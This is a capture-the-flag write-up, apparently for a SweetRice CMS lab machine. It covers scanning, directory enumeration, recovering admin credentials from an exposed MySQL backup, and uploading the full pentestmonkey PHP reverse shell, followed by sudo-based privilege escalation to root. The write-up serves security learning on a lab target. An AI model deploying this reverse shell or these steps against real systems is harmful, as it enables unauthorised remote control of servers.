<img width="1203" height="932" alt="image" src="https://github.com/user-attachments/assets/9dff1290-97f2-459b-aee4-2597903a243b" />

### Nmap scan: 
```
nmap -sC -sV -Pn -oN nmap_scan.txt 10.49.155.42 -v   
```
<img width="966" height="945" alt="image" src="https://github.com/user-attachments/assets/df39b402-5449-4760-bbe0-b1d4025dfd7d" />

#### Here 22 & 80 port is open..Now go to 10.49.155.42:80 [website] 
<img width="1329" height="945" alt="image" src="https://github.com/user-attachments/assets/1f249ad9-ef0d-4966-b15f-2dca86d5f95c" />

### Enumuration of 10.49.155.42:80 using gobuster
<img width="967" height="490" alt="image" src="https://github.com/user-attachments/assets/b970855f-1e70-49b0-b3c9-b34223e1b35b" />

#### get the dir /content ..Now visit 10.49.155.42/content
<img width="967" height="780" alt="image" src="https://github.com/user-attachments/assets/66afc9d7-e134-4e5f-95d9-2cdb616fe0fa" />

#### Here the website use SweetRice ..Now search for known vulnerabilities in SweetRice

### Enumuration of 10.49.155.42:80/content using gobuster
<img width="967" height="399" alt="image" src="https://github.com/user-attachments/assets/be46f6e8-1214-431d-a520-5f9c3b95bac6" />

#### Here i get a interesting folder named inc..Now explore it.. 
<img width="967" height="983" alt="image" src="https://github.com/user-attachments/assets/d021b241-9cb1-47cf-ab4a-375ef57bdfb0" />

#### It shows many files of the website which should not be shown and here it also shows mysql stored file which is more critical
<img width="967" height="350" alt="image" src="https://github.com/user-attachments/assets/18e8f1e0-9d5a-4d76-badc-e3ff668353bd" />

#### Now explore another path 10.49.155.42:80/content/as
<img width="967" height="722" alt="image" src="https://github.com/user-attachments/assets/c6d117dd-661e-44dc-b239-60c88c754b16" />

#### Here i need username and password for login and I found a sql file ..Now check if the sql file have the username and password..
<img width="967" height="262" alt="image" src="https://github.com/user-attachments/assets/0734833c-b332-48ee-ad9f-5de6bf39d2dc" />

#### decode the password using crackstation website and get the password : Password123 and the username is manager
<img width="967" height="393" alt="image" src="https://github.com/user-attachments/assets/2229449c-b102-4e74-95bc-7e11fd604e57" />


#### Now login to this website using this credentials
<img width="967" height="1008" alt="image" src="https://github.com/user-attachments/assets/48e75608-6455-416b-ab67-0c98e906e360" />
<img width="1914" height="955" alt="image" src="https://github.com/user-attachments/assets/021a238c-5e28-4c42-bf94-93c91190da5c" />

#### Now try for php reverse shell here 
<img width="1914" height="955" alt="image" src="https://github.com/user-attachments/assets/c535b341-e131-41fc-8232-cbfc63463ef3" />

code: 
```
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 

```

<img width="1914" height="955" alt="image" src="https://github.com/user-attachments/assets/eb367012-7ab3-4ecf-b834-a6e60bd09d07" />

Now access the endpoint of the file and I will get a reverse shell connection --> https://machineip/content/inc/ads/

<img width="732" height="764" alt="image" src="https://github.com/user-attachments/assets/c16c2eee-53e4-4c0c-b772-868a248cceda" />

<img width="732" height="764" alt="image" src="https://github.com/user-attachments/assets/6170e86b-7256-44ad-b05f-296bbffd3a07" />

#### Get the  reverse shell ..

#### Upgrade the Shell to a better shell environment
<img width="1085" height="159" alt="image" src="https://github.com/user-attachments/assets/b025b8cc-41dc-49d2-829f-5469635122af" />

#### Get the flag in /home/itguy/user.txt
<img width="1085" height="159" alt="image" src="https://github.com/user-attachments/assets/f9f787ee-5ad7-4d7d-b3ff-4e2c9127f44c" />

----
----
----

## Privilege Escalation to Root
<img width="929" height="169" alt="image" src="https://github.com/user-attachments/assets/e49d66ed-411f-44fa-9dc9-0841c3c0ced6" />

Findings:
The user www-data can run /usr/bin/perl /home/itguy/backup.pl with root privileges without needing a password.

Examine the backup.pl script
<img width="929" height="195" alt="image" src="https://github.com/user-attachments/assets/38d12892-c378-4752-927a-4a300120e00d" />

update copy.sh and then run and create a listener
<img width="929" height="310" alt="image" src="https://github.com/user-attachments/assets/46db3d48-8fc6-465e-a96f-a6da5ae54529" />

#### Get root access now find the root flag ..
<img width="929" height="195" alt="image" src="https://github.com/user-attachments/assets/90517d67-71db-4bfe-87b1-65b8f50e187f" />


#### The room is solved..



